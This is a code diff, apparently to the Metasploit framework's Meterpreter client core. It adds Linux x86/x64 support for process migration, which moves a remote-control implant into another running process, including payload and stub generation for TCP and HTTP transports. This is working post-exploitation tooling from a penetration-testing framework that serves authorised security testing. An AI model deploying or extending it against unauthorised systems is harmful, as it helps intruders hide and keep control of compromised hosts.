@@ -6,7 +6,6 @@ require 'rex/post/meterpreter/extension'
 require 'rex/post/meterpreter/extension_mapper'
 require 'rex/post/meterpreter/client'
 
-
 # certificate hash checking
 require 'rex/socket/x509_certificate'
 
@@ -607,6 +606,7 @@ class ClientCore < Extension
   # by pid.  The connection to the server remains established.
   #
   def migrate(target_pid, writable_dir = nil, opts = {})
+
     keepalive              = client.send_keepalives
     client.send_keepalives = false
     target_process         = nil
@@ -644,13 +644,14 @@ class ClientCore < Extension
     if current_process['pid'] == target_process['pid']
       raise RuntimeError, 'Cannot migrate into current process', caller
     end
+    
+    t = get_current_transport
 
-    migrate_stub = generate_migrate_stub(target_process)
-    migrate_payload = generate_migrate_payload(target_process)
+    migrate_payload = generate_migrate_payload(target_process, t[:url], client.payload_uuid)
+    migrate_stub = generate_migrate_stub(target_process, migrate_payload, migrate_payload.length, t)
 
     # Build the migration request
     request = Packet.create_request(COMMAND_ID_CORE_MIGRATE)
-
     request.add_tlv(TLV_TYPE_MIGRATE_PID, target_pid)
     request.add_tlv(TLV_TYPE_MIGRATE_PAYLOAD, migrate_payload, false, client.capabilities[:zlib])
     request.add_tlv(TLV_TYPE_MIGRATE_STUB, migrate_stub, false, client.capabilities[:zlib])
@@ -661,7 +662,7 @@ class ClientCore < Extension
     else
       request.add_tlv( TLV_TYPE_MIGRATE_ARCH, 1 ) # PROCESS_ARCH_X86
     end
-
+    
     # if we change architecture, we need to change UUID as well
     if current_process['arch'] != target_process['arch']
       client.payload_uuid.arch = target_process['arch']
@@ -822,12 +823,10 @@ private
   # Generate a migrate stub that is specific to the current transport type and the
   # target process.
   #
-  def generate_migrate_stub(target_process)
+  def generate_migrate_stub(target_process, payload=nil, payload_length=nil, t=nil)
     stub = nil
 
-
     if client.platform == 'windows' && [ARCH_X86, ARCH_X64].include?(client.arch)
-      t = get_current_transport
 
       c = Class.new(::Msf::Payload)
 
@@ -856,6 +855,39 @@ private
       end
 
       stub = c.new().generate
+    
+    elsif client.platform == 'linux' && [ARCH_X86, ARCH_X64].include?(client.arch)
+      
+      c = Class.new(::Msf::Payload)
+      
+      case target_process['arch']
+        when 'x86_64'
+          case t[:url]
+          when /^tcp/i
+            c.include(::Msf::Payload::Linux::X64::MigrateTcp)
+          when /^fd/i
+            c.include(::Msf::Payload::Linux::X64::MigrateTcp)
+          when /^http/i
+            c.include(::Msf::Payload::Linux::X64::MigrateHttp)
+          else
+            raise RuntimeError, "Unsupported transport #{t[:url]}"
+          end
+        when 'x86'
+          case t[:url]
+          when /^tcp/i
+            c.include(::Msf::Payload::Linux::X86::MigrateTcp)
+          when /^fd/i
+            c.include(::Msf::Payload::Linux::X86::MigrateTcp)
+          when /^http/i
+            c.include(::Msf::Payload::Linux::X86::MigrateHttp)
+          else
+            raise RuntimeError, "Unsupported transport #{t[:url]}"
+          end
+        else
+          raise RuntimeError, "Unsupported arch #{target_process['arch']}"
+      end
+
+      stub = c.new().generate(opts={"payload":payload,  "payload_length":payload_length, "pid": target_process['pid'], 'url': t[:url]})
     else
       raise RuntimeError, "Unsupported session #{client.session_type}"
     end
@@ -976,14 +1008,48 @@ private
 
     migrate_stager.stage_meterpreter({datastore: {'MeterpreterDebugBuild' => client.debug_build}})
   end
+  
+  def generate_migrate_linux_payload(target_process, url, uuid)
+  
+    c = Class.new( ::Msf::Payload )
+    c.include( ::Msf::Payload::Stager )
+    if target_process['arch'] == 'x86'
+      c.include( ::Msf::Payload::Linux::X86::MeterpreterLoader )
+    elsif target_process['arch'] == 'x86_64'
+      c.include( ::Msf::Payload::Linux::X64::MeterpreterLoader )
+    else
+      raise RuntimeError, "Unsupported target architecture '#{target_process['arch']}' for process '#{target_process['name']}'.", caller
+    end
+    scheme = nil
+    override_url = nil
+
+    case url
+    when /^tcp/i
+      scheme = 'tcp'
+    when /^fd/i
+      scheme = 'tcp'
+    when /^http/i
+      scheme = 'http' # Covers HTTP and HTTPS
+      override_url ||= url
+    else
+      raise RuntimeError, "Unsupported transport #{url}"
+    end
+
+    # Create the migrate stager
+    migrate_stager = c.new()
+
+    migrate_stager.stage_meterpreter({MeterpreterDebugBuild: client.debug_build, scheme: scheme, uuid: uuid, override_uri: override_url, stageless: true})
+  end
 
   #
   # Create a full migration payload specific to the target process.
   #
-  def generate_migrate_payload(target_process)
+  def generate_migrate_payload(target_process, url, uuid)
     case client.platform
     when 'windows'
       blob = generate_migrate_windows_payload(target_process)
+    when 'linux'
+      blob = generate_migrate_linux_payload(target_process, url, uuid)
     else
       raise RuntimeError, "Unsupported platform '#{client.platform}'"
     end
